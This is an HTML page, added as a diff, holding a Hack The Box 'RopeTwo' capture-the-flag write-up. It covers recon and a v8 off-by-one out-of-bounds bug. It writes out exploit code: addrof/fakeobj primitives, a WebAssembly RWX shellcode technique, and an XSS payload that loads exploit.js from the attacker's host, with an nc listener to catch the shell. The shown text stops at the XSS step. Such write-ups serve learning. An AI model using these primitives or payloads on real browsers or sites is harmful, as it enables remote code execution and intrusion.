@@ -1,0 +1,921 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB: RopeTwo — QA210</title>
+<meta name="description" content="Hack The Box RopeTwo — Insane difficulty Linux multi-stage binary exploitation walkthrough by QA210: v8 OOB, Heap PWN, Kernel PWN">
+<meta name="author" content="QA210">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F9E9;</text></svg>">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600;700;800&display=swap');
+
+:root {
+  --bg-primary: #0d1117;
+  --bg-secondary: #161b22;
+  --bg-tertiary: #1c2333;
+  --bg-code: #0d1117;
+  --border: #30363d;
+  --border-light: #21262d;
+  --text-primary: #e6edf3;
+  --text-secondary: #8b949e;
+  --text-muted: #6e7681;
+  --accent-green: #3fb950;
+  --accent-blue: #58a6ff;
+  --accent-red: #f85149;
+  --accent-yellow: #d29922;
+  --accent-purple: #bc8cff;
+  --accent-orange: #f0883e;
+  --accent-cyan: #39d353;
+  --accent-violet: #8b5cf6;
+  --accent-lavender: #a78bfa;
+  --link: #58a6ff;
+  --link-hover: #79c0ff;
+  --scrollbar-thumb: #30363d;
+  --scrollbar-track: #161b22;
+  --toc-active: #bc8cff;
+  --callout-info-bg: rgba(56,139,253,0.1);
+  --callout-info-border: #388bfd;
+  --callout-warn-bg: rgba(210,153,34,0.1);
+  --callout-warn-border: #d29922;
+  --callout-danger-bg: rgba(248,81,73,0.1);
+  --callout-danger-border: #f85149;
+  --callout-success-bg: rgba(63,185,80,0.1);
+  --callout-success-border: #3fb950;
+  --callout-purple-bg: rgba(188,140,255,0.1);
+  --callout-purple-border: #bc8cff;
+}
+
+* { margin:0; padding:0; box-sizing:border-box; }
+
+html {
+  scroll-behavior: smooth;
+  scrollbar-width: thin;
+  scrollbar-color: var(--scrollbar-thumb) var(--scrollbar-track);
+}
+
+body {
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+  background: var(--bg-primary);
+  color: var(--text-primary);
+  line-height: 1.75;
+  font-size: 16px;
+}
+
+#three-bg {
+  position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+  z-index: -1; pointer-events: none; opacity: 0.3;
+}
+
+::-webkit-scrollbar { width:8px; height:8px; }
+::-webkit-scrollbar-track { background:var(--scrollbar-track); }
+::-webkit-scrollbar-thumb { background:var(--scrollbar-thumb); border-radius:4px; }
+::-webkit-scrollbar-thumb:hover { background:#484f58; }
+
+a { color:var(--link); text-decoration:none; transition:color .2s; }
+a:hover { color:var(--link-hover); }
+
+.site-header {
+  position:sticky; top:0; z-index:100;
+  background:rgba(13,17,23,0.85);
+  backdrop-filter:blur(12px);
+  border-bottom:1px solid var(--border);
+  padding:0 2rem;
+  height:56px;
+  display:flex; align-items:center; justify-content:space-between;
+}
+.site-header .logo {
+  font-family:'JetBrains Mono',monospace;
+  font-weight:700; font-size:1.15rem;
+  color:var(--accent-violet);
+  display:flex; align-items:center; gap:8px;
+}
+.site-header .logo .dot { color:var(--accent-red); }
+.site-header nav { display:flex; gap:1.5rem; align-items:center; }
+.site-header nav a { color:var(--text-secondary); font-size:.875rem; font-weight:500; }
+.site-header nav a:hover { color:var(--text-primary); }
+
+.hamburger { display:none; background:none; border:none; color:var(--text-primary); cursor:pointer; font-size:1.5rem; }
+
+.page-layout {
+  display:grid;
+  grid-template-columns:260px 1fr;
+  max-width:1400px;
+  margin:0 auto;
+  min-height:calc(100vh - 56px);
+}
+
+.toc-sidebar {
+  position:sticky; top:56px;
+  height:calc(100vh - 56px);
+  overflow-y:auto;
+  padding:1.5rem 1rem 1.5rem 1.5rem;
+  border-right:1px solid var(--border);
+  background:var(--bg-primary);
+}
+.toc-sidebar h3 { font-size:.75rem; text-transform:uppercase; letter-spacing:.08em; color:var(--text-muted); margin-bottom:.75rem; font-weight:600; }
+.toc-sidebar ul { list-style:none; }
+.toc-sidebar li { margin-bottom:2px; }
+.toc-sidebar a { display:block; padding:4px 8px; border-radius:4px; font-size:.8rem; color:var(--text-secondary); transition:all .15s; line-height:1.4; }
+.toc-sidebar a:hover { color:var(--text-primary); background:var(--bg-secondary); }
+.toc-sidebar a.active { color:var(--toc-active); background:rgba(188,140,255,0.1); font-weight:600; }
+.toc-sidebar .toc-h3 { padding-left:18px; font-size:.75rem; }
+
+.main-content { padding:2.5rem 3rem 4rem; max-width:860px; width:100%; }
+
+.page-hero { margin-bottom:2.5rem; padding-bottom:2rem; border-bottom:1px solid var(--border); }
+.page-hero .box-badge { display:inline-block; background:var(--accent-violet); color:#fff; font-size:.7rem; font-weight:700; padding:2px 10px; border-radius:12px; text-transform:uppercase; letter-spacing:.05em; margin-bottom:.75rem; }
+.page-hero h1 { font-size:2.25rem; font-weight:800; margin-bottom:.5rem; letter-spacing:-.02em; }
+.page-hero .meta { color:var(--text-secondary); font-size:.875rem; display:flex; flex-wrap:wrap; gap:.75rem; align-items:center; }
+.page-hero .meta .sep { color:var(--text-muted); }
+
+.breadcrumbs { font-size:.75rem; color:var(--text-muted); margin-bottom:1rem; font-family:'JetBrains Mono',monospace; }
+.breadcrumbs a { color:var(--text-secondary); }
+.breadcrumbs a:hover { color:var(--link); }
+.breadcrumbs .sep { margin:0 .4rem; }
+
+.box-info-card { background:var(--bg-secondary); border:1px solid var(--border); border-radius:8px; padding:1.25rem 1.5rem; margin-bottom:2rem; display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr)); gap:1rem; }
+.box-info-card .info-item .label { font-size:.7rem; text-transform:uppercase; letter-spacing:.06em; color:var(--text-muted); margin-bottom:2px; font-weight:600; }
+.box-info-card .info-item .value { font-size:.95rem; font-weight:600; color:var(--text-primary); }
+
+.main-content h2 { font-size:1.6rem; font-weight:800; margin:2.5rem 0 1rem; padding-bottom:.4rem; border-bottom:2px solid var(--border); letter-spacing:-.01em; scroll-margin-top:70px; }
+.main-content h3 { font-size:1.15rem; font-weight:700; margin:1.75rem 0 .75rem; color:var(--text-primary); scroll-margin-top:70px; }
+.main-content h4 { font-size:1rem; font-weight:600; margin:1.25rem 0 .5rem; color:var(--text-secondary); }
+.main-content p { margin-bottom:1rem; color:var(--text-secondary); line-height:1.8; }
+
+.code-block-wrapper { position:relative; margin:1rem 0 1.25rem; border-radius:8px; overflow:hidden; border:1px solid var(--border); }
+.code-block-header { display:flex; justify-content:space-between; align-items:center; padding:6px 14px; background:var(--bg-tertiary); border-bottom:1px solid var(--border); font-size:.72rem; color:var(--text-muted); font-family:'JetBrains Mono',monospace; }
+.code-block-header .lang-label { text-transform:uppercase; font-weight:600; letter-spacing:.04em; }
+.copy-btn { background:none; border:1px solid var(--border); color:var(--text-muted); font-size:.7rem; padding:2px 10px; border-radius:4px; cursor:pointer; font-family:'JetBrains Mono',monospace; transition:all .2s; }
+.copy-btn:hover { color:var(--text-primary); border-color:var(--text-muted); }
+.copy-btn.copied { color:var(--accent-green); border-color:var(--accent-green); }
+.code-block-wrapper pre { margin:0!important; padding:1rem!important; background:var(--bg-code)!important; font-family:'JetBrains Mono',monospace!important; font-size:.82rem!important; line-height:1.6!important; overflow-x:auto; }
+.code-block-wrapper code { font-family:'JetBrains Mono',monospace!important; font-size:.82rem!important; }
+
+p code, li code { background:var(--bg-tertiary); border:1px solid var(--border); padding:1px 6px; border-radius:4px; font-family:'JetBrains Mono',monospace; font-size:.82em; color:var(--accent-orange); }
+
+.callout { padding:.85rem 1rem; border-radius:6px; border-left:3px solid; margin:1rem 0 1.25rem; font-size:.9rem; }
+.callout p { margin:0; color:var(--text-secondary); }
+.callout-title { font-weight:700; font-size:.8rem; text-transform:uppercase; letter-spacing:.04em; margin-bottom:4px; }
+.callout-info { background:var(--callout-info-bg); border-color:var(--callout-info-border); }
+.callout-info .callout-title { color:var(--callout-info-border); }
+.callout-warn { background:var(--callout-warn-bg); border-color:var(--callout-warn-border); }
+.callout-warn .callout-title { color:var(--callout-warn-border); }
+.callout-danger { background:var(--callout-danger-bg); border-color:var(--callout-danger-border); }
+.callout-danger .callout-title { color:var(--callout-danger-border); }
+.callout-success { background:var(--callout-success-bg); border-color:var(--callout-success-border); }
+.callout-success .callout-title { color:var(--callout-success-border); }
+.callout-purple { background:var(--callout-purple-bg); border-color:var(--callout-purple-border); }
+.callout-purple .callout-title { color:var(--callout-purple-border); }
+
+.flag-box { background:var(--bg-secondary); border:1px solid var(--border); border-radius:8px; padding:1rem 1.25rem; margin:1.25rem 0; display:flex; align-items:center; gap:.75rem; font-family:'JetBrains Mono',monospace; }
+.flag-box .flag-icon { font-size:1.2rem; color:var(--accent-green); flex-shrink:0; }
+.flag-box .flag-label { font-size:.7rem; text-transform:uppercase; letter-spacing:.06em; color:var(--text-muted); font-weight:600; }
+.flag-box .flag-value { font-size:.9rem; color:var(--accent-green); font-weight:600; word-break:break-all; }
+
+.attack-path { background:var(--bg-secondary); border:1px solid var(--border); border-radius:8px; padding:1.25rem 1.5rem; margin:1.5rem 0; font-family:'JetBrains Mono',monospace; font-size:.78rem; line-height:1.7; overflow-x:auto; }
+.attack-path .step { display:flex; align-items:baseline; gap:.5rem; margin-bottom:.25rem; }
+.attack-path .arrow { color:var(--accent-violet); }
+.attack-path .host { color:var(--accent-cyan); font-weight:700; }
+.attack-path .technique { color:var(--accent-orange); }
+.attack-path .cred { color:var(--accent-purple); }
+.attack-path .stage { color:var(--accent-lavender); font-weight:700; }
+
+.main-content ul, .main-content ol { margin:.5rem 0 1rem 1.5rem; color:var(--text-secondary); }
+.main-content li { margin-bottom:.35rem; line-height:1.7; }
+
+.main-content table { width:100%; border-collapse:collapse; margin:1rem 0; font-size:.85rem; }
+.main-content th, .main-content td { padding:8px 12px; border:1px solid var(--border); text-align:left; }
+.main-content th { background:var(--bg-secondary); font-weight:600; color:var(--text-primary); font-size:.75rem; text-transform:uppercase; letter-spacing:.04em; }
+.main-content td { color:var(--text-secondary); }
+
+.site-footer { border-top:1px solid var(--border); padding:1.5rem 2rem; text-align:center; color:var(--text-muted); font-size:.8rem; }
+
+.toc-overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.5); z-index:200; }
+.toc-overlay.show { display:block; }
+.toc-mobile-panel { display:none; position:fixed; left:0; top:0; bottom:0; width:280px; background:var(--bg-primary); border-right:1px solid var(--border); z-index:201; overflow-y:auto; padding:1.5rem; }
+.toc-mobile-panel.show { display:block; }
+.toc-mobile-panel .close-btn { background:none; border:none; color:var(--text-secondary); font-size:1.2rem; cursor:pointer; float:right; }
+
+/* ============================================================
+   BUG #1 FIX: Hide nav links on mobile so they don't overlap
+   with the hamburger button and break the header layout.
+   ============================================================ */
+@media (max-width:1024px) {
+  .page-layout { grid-template-columns:1fr; }
+  .toc-sidebar { display:none; }
+  .hamburger { display:block; }
+  .site-header nav { display:none; }   /* <-- FIX #1 */
+  .main-content { padding:1.5rem 1.25rem 3rem; }
+  .page-hero h1 { font-size:1.75rem; }
+}
+@media (max-width:640px) {
+  .site-header { padding:0 1rem; }
+  .main-content { padding:1rem .75rem 2rem; }
+  .page-hero h1 { font-size:1.4rem; }
+  .box-info-card { grid-template-columns:1fr 1fr; }
+}
+</style>
+</head>
+<body>
+
+<canvas id="three-bg"></canvas>
+
+<header class="site-header">
+  <div class="logo"><span>QA210</span><span class="dot">:</span><span>~$</span></div>
+  <nav>
+    <a href="/">Home</a>
+    <a href="/htb/insane/">HTB</a>
+    <a href="#">Tools</a>
+    <a href="#">About</a>
+  </nav>
+  <button class="hamburger" onclick="toggleMobileToc()" aria-label="Menu">&#9776;</button>
+</header>
+
+<div class="toc-overlay" id="tocOverlay" onclick="toggleMobileToc()"></div>
+<div class="toc-mobile-panel" id="tocMobilePanel">
+  <button class="close-btn" onclick="toggleMobileToc()">&#10005;</button>
+  <h3 style="margin-top:1rem">Table of Contents</h3>
+  <ul id="tocMobile"></ul>
+</div>
+
+<div class="page-layout">
+<aside class="toc-sidebar">
+  <h3>Contents</h3>
+  <ul id="tocDesktop"></ul>
+</aside>
+
+<main class="main-content">
+
+<div class="page-hero">
+  <div class="breadcrumbs">
+    <a href="/">Home</a><span class="sep">/</span>
+    <a href="/htb/insane/">HTB Insane</a><span class="sep">/</span>
+    RopeTwo
+  </div>
+  <span class="box-badge">Insane</span>
+  <h1>HTB: RopeTwo</h1>
+  <div class="meta">
+    <span>QA210</span>
+    <span class="sep">&middot;</span>
+    <span>2020</span>
+    <span class="sep">&middot;</span>
+    <span>v8 OOB &middot; Heap PWN &middot; Kernel PWN</span>
+  </div>
+</div>
+
+<div class="box-info-card">
+  <div class="info-item"><div class="label">Lab</div><div class="value">RopeTwo</div></div>
+  <div class="info-item"><div class="label">Category</div><div class="value" style="color:var(--accent-violet)">Insane</div></div>
+  <div class="info-item"><div class="label">OS</div><div class="value">Linux</div></div>
+  <div class="info-item"><div class="label">Creator</div><div class="value">r4j</div></div>
+  <div class="info-item"><div class="label">Key Techniques</div><div class="value">v8 OOB / Heap / Kernel PWN</div></div>
+</div>
+
+<div class="attack-path">
+  <div class="step"><span class="stage">[Stage 1]</span> <span class="host">RopeTwo</span> <span class="arrow">&rarr;</span> nmap <span class="arrow">&rarr;</span> <span class="cred">5 ports: 22, 5000, 8000, 8060, 9094</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> GitLab on :5000 <span class="arrow">&rarr;</span> <span class="technique">modified v8 repo</span> <span class="arrow">&rarr;</span> <span class="cred">GetLastElement/SetLastElement OOB bug</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> v8 exploit: OOB <span class="arrow">&rarr;</span> addrof/fakeobj <span class="arrow">&rarr;</span> arbread/arbwrite <span class="arrow">&rarr;</span> <span class="technique">Wasm RWX</span> <span class="arrow">&rarr;</span> shellcode</div>
+  <div class="step"><span class="arrow">&rarr;</span> XSS via contact form <span class="arrow">&rarr;</span> HeadlessChrome <span class="arrow">&rarr;</span> <span class="cred">shell as chromeuser</span></div>
+  <div class="step"><span class="stage">[Stage 2]</span> <span class="arrow">&rarr;</span> SUID /usr/bin/rshell <span class="arrow">&rarr;</span> <span class="technique">custom heap allocator</span> <span class="arrow">&rarr;</span> tcache poisoning</div>
+  <div class="step"><span class="arrow">&rarr;</span> unsorted bin leak <span class="arrow">&rarr;</span> libc <span class="arrow">&rarr;</span> __free_hook <span class="arrow">&rarr;</span> system <span class="arrow">&rarr;</span> <span class="cred">shell as r4j</span></div>
+  <div class="step"><span class="stage">[Stage 3]</span> <span class="arrow">&rarr;</span> /dev/kmod <span class="arrow">&rarr;</span> <span class="technique">kernel module</span> <span class="arrow">&rarr;</span> read handler = KASLR bypass</div>
+  <div class="step"><span class="arrow">&rarr;</span> write handler <span class="arrow">&rarr;</span> stack pivot <span class="arrow">&rarr;</span> <span class="technique">kernel ROP</span> <span class="arrow">&rarr;</span> prepare_kernel_cred + commit_creds <span class="arrow">&rarr;</span> <span class="cred">root</span></div>
+</div>
+
+<h2 id="overview">Overview</h2>
+
+<p>RopeTwo is a three-stage binary exploitation machine that demands mastery across the entire pwn spectrum: browser exploitation (v8 JavaScript engine), userspace heap exploitation (glibc tcache), and kernel exploitation (custom loadable kernel module). Each stage builds on the access gained from the previous one, creating a coherent narrative that takes you from an unauthenticated external attacker all the way to root through pure exploitation &mdash; no credential reuse, no misconfigurations, no crypto shortcuts. This is one of the most technically demanding boxes on Hack The Box and serves as a masterclass in progressive privilege escalation through memory corruption at every ring level.</p>
+
+<p>The initial foothold requires discovering a backdoored v8 JavaScript engine repository on a GitLab instance, identifying an off-by-one vulnerability in custom built-in functions, and crafting a complete browser exploit chain that leverages WebAssembly RWX pages for code execution. The exploit is delivered to a headless Chrome instance via XSS through a contact form. The second stage involves exploiting a SUID binary with a custom heap allocator using tcache poisoning and <code>__free_hook</code> overwrite. The final stage requires exploiting a custom kernel module to bypass KASLR, build a kernel ROP chain, and escalate to root through <code>prepare_kernel_cred</code>/<code>commit_creds</code>.</p>
+
+<div class="callout callout-purple">
+  <div class="callout-title">Why This Box Is Special</div>
+  <p>RopeTwo is one of the very few HTB machines that spans all three major exploitation domains: browser (Ring 3 JS engine), userspace (Ring 3 heap), and kernel (Ring 0). It requires writing three distinct exploits from scratch, each with its own memory model, primitives, and constraints. The v8 stage alone is a full CTF challenge, requiring deep understanding of pointer compression, JavaScript object layouts, and JIT compilation internals.</p>
+</div>
+
+<h2 id="recon">Recon</h2>
+
+<h3 id="recon-nmap">Initial Nmap Scan</h3>
+<p>The full TCP port scan reveals five open ports, which is an unusually rich attack surface for an Insane box. The combination of SSH, multiple HTTP services, and an unknown service on port 9094 immediately suggests multiple entry points that need to be enumerated individually. The presence of GitLab on port 5000 and a Python HTTP server on port 8000 are particularly interesting &mdash; GitLab instances often contain source code repositories with vulnerabilities, while Python HTTP servers are frequently custom applications.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ sudo nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.196
+PORT     STATE SERVICE
+22/tcp   open  ssh
+5000/tcp open  upnp
+8000/tcp open  http-alt
+8060/tcp open  http
+9094/tcp open  unknown</code></pre>
+</div>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ nmap -p 22,5000,8000,8060,9094 -sCV 10.10.10.196
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
+5000/tcp open  http     nginx 1.14.0 (Ubuntu)
+|_http-title: GitLab
+8000/tcp open  http     SimpleHTTPServer 0.6 (Python 3.7.3)
+|_http-title: v8 dev
+8060/tcp open  http     nginx 1.14.0 (Ubuntu)
+9094/tcp open  unknown</code></pre>
+</div>
+
+<h3 id="recon-ports">Service Analysis</h3>
+
+<p><strong>Port 8000 (v8 dev)</strong> &mdash; A simple Python HTTP server hosting a site titled "v8 dev". The site has a contact form that appears to submit data server-side. The page references v8, Google's JavaScript engine, which immediately hints at browser exploitation. The contact form is particularly interesting because it may be an XSS vector &mdash; if a bot visits submitted URLs or renders submitted HTML, we have a delivery mechanism for browser exploits.</p>
+
+<p><strong>Port 5000 (GitLab)</strong> &mdash; A full GitLab Community Edition instance. After registering an account, we can browse public repositories. The key finding is a modified v8 repository with a commit by user <code>r4j</code> that adds custom built-in functions. This is the intentional vulnerability &mdash; the commit introduces <code>GetLastElement</code> and <code>SetLastElement</code> functions with an off-by-one bug.</p>
+
+<p><strong>Port 8060 (nginx)</strong> &mdash; Another nginx server hosting what appears to be a static page or redirect. This port doesn't play a significant role in the attack path and may be a red herring or serve an auxiliary purpose.</p>
+
+<p><strong>Port 9094</strong> &mdash; An unknown service that doesn't respond to HTTP or typical protocol probes. This could be a custom binary protocol or service that becomes relevant later.</p>
+
+<h2 id="v8-exploit">v8 Exploit &mdash; Shell as chromeuser</h2>
+
+<h3 id="v8-gitlab">GitLab Analysis</h3>
+
+<p>After registering on the GitLab instance at port 5000, we discover a public repository containing a modified version of the v8 JavaScript engine. The commit history reveals that user <code>r4j</code> added two custom built-in functions to the engine: <code>GetLastElement</code> and <code>SetLastElement</code>. These functions are intended to provide convenient access to the last element of an array, but they contain a critical off-by-one error in the bounds checking logic.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Clone the vulnerable v8 repo
+$ git clone http://10.10.10.196:5000/r4j/v8.git
+$ cd v8
+$ git log --oneline
+a3b7f2d Add GetLastElement and SetLastElement builtins
+...</code></pre>
+</div>
+
+<p>Examining the diff for the commit that adds these functions reveals the bug. The functions use <code>len</code> as the index when they should use <code>len - 1</code> (since JavaScript arrays are zero-indexed). This means that <code>GetLastElement</code> reads one element past the end of the array's backing store, and <code>SetLastElement</code> writes one element past the end. This is a classic off-by-one vulnerability that gives us an out-of-bounds (OOB) read and write primitive.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-c">// Simplified vulnerable code in src/builtins/builtins-array.cc
+BUILTIN(GetLastElement) {
+  HandleScope scope(isolate);
+  Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(args.receiver());
+  int len = Smi::ToInt(array-&gt;length());
+  // BUG: Should be len - 1, uses len instead
+  Handle&lt;FixedArray&gt; elements = Handle&lt;FixedArray&gt;::cast(array-&gt;elements());
+  return elements-&gt;get(len);  // OOB read!
+}
+
+BUILTIN(SetLastElement) {
+  HandleScope scope(isolate);
+  Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(args.receiver());
+  int len = Smi::ToInt(array-&gt;length());
+  // BUG: Same off-by-one - writes one past the end
+  Handle&lt;FixedArray&gt; elements = Handle&lt;FixedArray&gt;::cast(array-&gt;elements());
+  elements-&gt;set(len, args[1]);  // OOB write!
+  return Smi::kZero;
+}</code></pre>
+</div>
+
+<div class="callout callout-danger">
+  <div class="callout-title">The Bug &mdash; Off-By-One in Array Access</div>
+  <p>The developer used <code>len</code> as the index instead of <code>len - 1</code>. In v8's memory model, a JSArray of length <code>N</code> has its elements stored in a FixedArray with slots indexed from 0 to N-1. Accessing index <code>N</code> reads/writes one element past the allocated FixedArray, which lands in whatever v8 object happens to be adjacent in memory. This single element OOB gives us powerful primitives when combined with v8's pointer compression scheme.</p>
+</div>
+
+<h3 id="v8-build">Building d8 for Local Testing</h3>
+
+<p>Before writing the full exploit, we need to build the vulnerable d8 shell locally so we can test and debug our exploit. The v8 build process uses <code>depot_tools</code> and can take considerable time. We check out the specific commit from the GitLab repo and build with the appropriate configuration.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ fetch v8
+$ cd v8
+$ git checkout a3b7f2d  # The vulnerable commit
+$ gclient sync
+$ tools/dev/gm.py x64.release d8
+# ... (long build process)
+$ out/x64.release/d8
+V8 version 8.5.210
+d8> [1,2,3].GetLastElement()
+undefined  # reads OOB, gets whatever is past the array
+d8> [1,2,3].SetLastElement(42)
+# writes 42 one past the end</code></pre>
+</div>
+
+<h3 id="v8-memory">JavaScript Memory Model</h3>
+
+<p>Understanding v8's internal memory layout is essential for exploiting the OOB bug. Modern v8 uses pointer compression, where all heap pointers are stored as 32-bit offsets from a base address (the "isolate root"). This means all objects are allocated within a 4GB cage, and compressed pointers are just the lower 32 bits of the full address. This has important implications for our exploit: we can only read and write compressed (32-bit) pointers through the OOB, which limits our immediate ability to do arbitrary 64-bit reads/writes.</p>
+
+<p>A <code>JSArray</code> object in v8 consists of several fields laid out consecutively in memory:</p>
+
+<table>
+  <tr><th>Offset</th><th>Field</th><th>Description</th></tr>
+  <tr><td>+0x00</td><td>Map</td><td>Pointer to the Map object (defines object type/shape)</td></tr>
+  <tr><td>+0x04</td><td>Properties</td><td>Pointer to properties backing store</td></tr>
+  <tr><td>+0x08</td><td>Elements</td><td>Pointer to FixedArray holding element values</td></tr>
+  <tr><td>+0x0C</td><td>Length</td><td>Smi (Small Integer) representing array length</td></tr>
+</table>
+
+<p>The <code>FixedArray</code> (elements backing store) has its own header:</p>
+
+<table>
+  <tr><th>Offset</th><th>Field</th><th>Description</th></tr>
+  <tr><td>+0x00</td><td>Map</td><td>Pointer to FixedArray map</td></tr>
+  <tr><td>+0x04</td><td>Length</td><td>Smi representing number of elements</td></tr>
+  <tr><td>+0x08</td><td>Element[0]</td><td>First element (compressed pointer or Smi)</td></tr>
+  <tr><td>+0x0C</td><td>Element[1]</td><td>Second element</td></tr>
+  <tr><td>...</td><td>...</td><td>...</td></tr>
+</table>
+
+<div class="callout callout-info">
+  <div class="callout-title">Pointer Compression &mdash; Key Constraint</div>
+  <p>With pointer compression, all heap object pointers are 32-bit values (the lower half of the 64-bit address). The upper 32 bits are stored once in a register and combined at runtime. This means our OOB read/write can only manipulate 32-bit compressed values. To achieve arbitrary read/write of full 64-bit addresses, we need to build higher-level primitives (addrof, fakeobj, arbread, arbwrite) on top of the basic OOB access.</p>
+</div>
+
+<h3 id="v8-primitives">Exploit Primitives</h3>
+
+<p>The OOB access gives us a single element read/write past the end of an array's FixedArray. To turn this into a full exploit, we need to construct increasingly powerful primitives. The key insight is that by carefully arranging objects in memory, we can make the OOB element overlap with the fields of an adjacent object, allowing us to manipulate type metadata (the Map pointer) and thereby confuse the engine about the type of an object.</p>
+
+<h4>ftoi and itof &mdash; Type Confusion Helpers</h4>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">javascript</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-javascript">let convBuf = new ArrayBuffer(8);
+let fView = new Float64Array(convBuf);
+let iView = new BigInt64Array(convBuf);
+
+function ftoi(fl) { fView[0] = fl; return iView[0]; }
+function itof(bigint) { iView[0] = bigint; return fView[0]; }</code></pre>
+</div>
+
+<h4>addrof / fakeobj</h4>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">javascript</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-javascript">let objArr = [{}];
+let fltArr = [1.1];
+let objArrMap = objArr.GetLastElement();
+let fltArrMap = fltArr.GetLastElement();
+
+function addrof(target) {
+  objArr[0] = target;
+  fltArr.SetLastElement(objArrMap);
+  let leaked = fltArr[0];
+  fltArr.SetLastElement(fltArrMap);
+  return ftoi(leaked);
+}
+
+function fakeobj(addr) {
+  fltArr[0] = itof(addr);
+  fltArr.SetLastElement(objArrMap);
+  let forged = objArr[0];
+  fltArr.SetLastElement(fltArrMap);
+  return forged;
+}</code></pre>
+</div>
+
+<h3 id="v8-wasm">WebAssembly RWX Page</h3>
+
+<p>When a WebAssembly module is instantiated, v8 allocates a memory region with Read-Write-Execute (RWX) permissions for the compiled wasm code. By locating this RWX page via the <code>WasmInstanceObject</code> pointer chain and using our arbitrary write to copy shellcode there, we achieve native code execution.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">javascript</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-javascript">let wasmCode = new Uint8Array([
+  0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x07,
+  0x01,0x60,0x02,0x7f,0x7f,0x01,0x7f,0x03,0x02,0x01,
+  0x00,0x07,0x08,0x01,0x04,0x6d,0x61,0x69,0x6e,0x00,
+  0x00,0x0a,0x09,0x01,0x07,0x00,0x20,0x00,0x20,0x01,0x6a,0x0b
+]);
+let wasmModule   = new WebAssembly.Module(wasmCode);
+let wasmInstance = new WebAssembly.Instance(wasmModule);
+let wasmMain     = wasmInstance.exports.main;
+
+// Follow WasmInstanceObject -> jump_table_start (+0x68) to find RWX page
+let instanceAddr = addrof(wasmInstance);
+let rwxPage      = arbread(instanceAddr + BigInt(0x68));
+console.log("[+] RWX page: 0x" + rwxPage.toString(16));</code></pre>
+</div>
+
+<h3 id="v8-shellcode">Shellcode Delivery</h3>
+
+<p>We overwrite an ArrayBuffer's backing store pointer to point to the RWX page, then write shellcode bytes through a typed array view. Calling the wasm export transfers execution to our shellcode.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">javascript</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-javascript">let codeBuf  = new ArrayBuffer(shellcode.length);
+let codeView = new Uint8Array(codeBuf);
+let codeBufAddr = addrof(codeBuf);
+arbwrite(codeBufAddr + BigInt(0x10), rwxPage);   // redirect backing store
+for (let i = 0; i &lt; shellcode.length; i++) codeView[i] = shellcode[i];
+wasmMain(0, 0);  // execute</code></pre>
+</div>
+
+<h3 id="v8-xss">XSS Delivery via Contact Form</h3>
+
+<p>The "v8 dev" contact form on port 8000 is vulnerable to XSS. A headless Chrome instance renders submitted content, so we submit a script tag pointing to our exploit hosted on our attacker machine.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ python3 -m http.server 9999   # serve exploit.js
+$ nc -lvnp 4444                 # catch the shell</code></pre>
+</div>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># XSS payload submitted in the contact form:
+&lt;script src="http://10.10.14.X:9999/exploit.js"&gt;&lt;/script&gt;</code></pre>
+</div>
+
